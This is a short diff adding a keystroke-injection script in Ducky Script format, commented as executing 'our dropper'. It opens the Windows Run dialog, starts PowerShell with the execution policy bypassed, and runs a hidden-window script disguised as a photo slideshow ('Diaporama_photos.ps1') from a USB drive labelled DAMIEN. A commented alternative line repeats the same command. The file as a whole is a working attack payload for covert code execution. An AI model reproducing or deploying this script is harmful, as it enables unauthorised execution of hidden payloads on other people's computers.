@@ -1,0 +1,12 @@
+REM Execute our dropper
+DELAY 1000
+GUI r
+DELAY 100
+STRING Powershell.exe -Exec Bypass -noexit powershell 
+ENTER
+DELAY 100
+STRING $d = "DAMIEN"; powershell -WindowStyle hidden "$((Get-WMIObject Win32Volume | ? { $.Label -eq $d }).DriveLetter)\Diaporama_photos.ps1"
+ENTER
+
+
+REM Powershell.exe -Exec Bypass -noexit '$d = "DAMIEN"; powershell "$((Get-WMIObject Win32Volume | ? { $.Label -eq $d }).DriveLetter)\Diaporama_photos.ps1"'
